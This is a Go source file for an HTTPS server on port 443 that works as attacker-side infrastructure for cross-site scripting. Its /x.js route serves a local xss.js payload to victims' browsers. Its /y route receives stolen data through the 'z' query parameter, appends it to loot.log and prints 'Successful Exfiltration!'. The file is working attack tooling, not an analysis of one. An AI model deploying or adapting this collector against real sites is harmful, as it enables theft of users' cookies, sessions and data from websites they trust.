package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/julienschmidt/httprouter" // Credits to Julien Schmidt for efforts creating the httprouter project.
)

func Xjs(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
	xssdata, err := ioutil.ReadFile("xss.js")
	if err != nil {
		fmt.Println("File reading error", err)
		return
	}
	fmt.Fprintf(w, string(xssdata))
}

func Exfil(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	queryValues := r.URL.Query()
	fmt.Fprintf(w, "Captured:, %s\n", queryValues.Get("z"))
	f, err := os.OpenFile("loot.log", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}
	newLine := queryValues.Get("z")
	_, err = fmt.Fprintln(f, newLine)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
	err = f.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Successful Exfiltration!")
	fmt.Println("Reading loot.log...")
	loot, err := ioutil.ReadFile("loot.log")
	if err != nil {
		fmt.Println("File reading error", err)
		return
	}
	fmt.Println(string(loot))
}

func main() {
	router := httprouter.New()
	router.GET("/x.js", Xjs)
	router.GET("/y", Exfil)

	log.Println("** Service Started on Port 443 **")

	err := http.ListenAndServeTLS(":443", "certs/victim.crt", "certs/victim.key", router) // Update SSL certificate names.
	if err != nil {
		log.Fatal(err)
	}
}
